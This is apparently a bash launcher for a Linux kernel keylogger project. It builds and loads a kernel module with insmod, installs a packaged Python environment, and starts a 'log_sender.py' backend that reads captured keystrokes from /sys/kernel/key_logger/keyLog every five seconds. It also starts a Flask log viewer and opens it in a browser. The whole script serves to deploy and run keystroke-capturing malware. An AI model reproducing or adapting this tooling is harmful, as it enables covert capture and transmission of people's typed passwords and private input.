#!/bin/bash
#GLOBAL VARS
#set -e
FILE_TO_BUILD='knk-yi'
DEVICE='keylog5'
#build the module
echo "cleaning"
make clean
rm -f keylog*
rmmod "$FILE_TO_BUILD"
echo "Builind"
#make -f "$FILE_TO_BUILD".c
make
#load module & create inode
insmod "$FILE_TO_BUILD".ko
#echo "waiting to get MAJOR"
echo "Creating a K-object in the background"
sleep 3s
#GET MAJOR MINOR
#MAJOR=$(ls -ln keylog5 \| cut -d \' \' -f 5 \| sed -r \'s/[,]+/ /g\')
#mknod "$DEVICE" c 244 0
#run python on background
echo "Installing portable conda Env"
mkdir ../myenv
tar -xf ../BE/klenv.tar.gz -C ../myenv
source ../myenv/bin/activate
pip install -r ../BE/requeriments.txt
pip install python-dotenv
pip install flask
echo "Running BackEnd script in (SERVER SIDE): "
echo $(which python)
$(which python) ../BE/log_sender.py -f "/sys/kernel/key_logger/keyLog"  -t 5 &
sleep 5s
echo "Running frotEnd logs viewer (USER SIDE): " 
export FLASK_ENV=development
export FLASK_APP=../FE/main.py
flask run &
sleep 5s
firefox https://localhost:5000



